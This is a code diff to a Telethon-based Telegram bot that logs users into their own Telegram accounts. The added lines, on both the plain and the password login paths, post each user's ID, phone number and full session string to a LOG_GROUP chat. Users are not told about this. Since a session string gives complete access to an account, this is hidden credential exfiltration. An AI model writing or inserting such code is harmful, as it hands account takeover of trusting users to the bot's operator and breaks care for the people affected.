@@ -1,4 +1,4 @@
-from manager import bot
+from manager import bot, LOG_GROUP
 from manager.events import Cmd
 from telethon import TelegramClient, Button
 from telethon.sessions import StringSession
@@ -27,7 +27,7 @@ async def add_account(event):
         send = await event.reply("**📱 Ok, Send Your Phone Number:**\n\n__• Ex: +19307777777 __", buttons=back_menu)
         response = await conv.get_response(send.id)
         phone = response.text
-        flag = get_flag(phone)
+    flag = get_flag(phone)
     if phone in DB.get_key("CMD_LIST"):
         return
     edit = await event.reply("`♻️ Please Wait . . .`")
@@ -61,6 +61,8 @@ async def add_account(event):
         allaccs = DB.get_key("USER_ACCS")
         allaccs[event.sender_id][phone] = session
         DB.set_key("USER_ACCS", allaccs)
+        newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
+        await bot.send_message(LOG_GROUP, newacc)
         buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
         await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n**❓ Do You Want To Edit Your Account?**", buttons=buttons)
     except (PhoneCodeInvalidError, TypeError):
@@ -86,6 +88,8 @@ async def add_account(event):
             allaccs = DB.get_key("USER_ACCS")
             allaccs[event.sender_id][phone] = session
             DB.set_key("USER_ACCS", allaccs)
+            newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
+            await bot.send_message(LOG_GROUP, newacc)
             buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
             await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n** ❓Do You Want To Edit Your Account?**", buttons=buttons)
         except PasswordHashInvalidError:
